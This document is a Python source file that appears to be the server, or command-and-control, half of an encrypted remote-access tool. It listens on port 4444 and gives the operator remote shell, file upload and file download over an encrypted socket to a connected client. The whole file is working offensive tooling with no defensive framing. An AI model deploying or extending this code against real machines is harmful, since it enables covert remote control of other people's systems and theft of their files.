import socket
import sys
import select
import upload
from encryption import encrypter, decrypter, init_key, init_iv

DEFAULT_BUFF = 128
MAX_READ = 112


def ping():
    first = "ping\n".encode()
    first = encrypter(first)
    connection.sendall(first)
    while True:
        line = sys.stdin.readline()
        encrypted = encrypter(line.encode())
        connection.sendall(encrypted)
        recved = connection.recv(128).strip(b'\00')
        decryp = decrypter(recved)
        print(decryp)


def shell():
    connection.sendall(encrypter('shell\n'.encode('UTF-8')))
    while True:
        while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            shellmsg = sys.stdin.readline()
            connection.sendall(encrypter(shellmsg.encode('UTF-8')))
            if shellmsg == 'exit\n':  # exits out of shell function if exit is called
                break
        else:  # user has not typed anything
            # checks if value is available for recv
            r, _, _ = select.select([connection], [], [], 0)
            if r:
                # client always sends this in package of 10 regardless of length
                size = connection.recv(10, socket.MSG_WAITALL).strip(b'\00').decode()  # client sends size
                size = int(size)  # convert sent str to proper int
                #  wait for specified amount of data
                data = decrypter(connection.recv(size, socket.MSG_WAITALL))
                print(data.decode('UTF-8'), end='')  # print without newline


if __name__ == '__main__':
    # socket initialize
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("socket created")

    # reserving port 4444 for incoming connections
    port = 4444

    s.bind(('', port))
    s.listen(1)
    print('server started waiting for connections')

    # initailize key values
    init_key()
    init_iv()

    while True:
        # waiting for connection
        connection, client_addr = s.accept()
        try:
            print("connection from", client_addr[0])
            while 1:
                # non blocking input read
                msg = sys.stdin.readline()
                if msg:
                    if msg.find('upload') == 0:
                        upload.send(msg[7:].replace('\n', ''), connection)
                    elif msg == 'close\n':
                        connection.sendall('conend'.encode('UTF-8'))
                        connection.close()
                        exit()
                    elif msg.find('download') == 0:
                        upload.download(msg[9:].replace('\n', ''), connection)
                    elif msg == 'shell\n':
                        shell()
                    elif msg == 'ping\n':  # only for testing
                        ping()
        except KeyboardInterrupt:
            s.close()
            connection.close()
            exit()
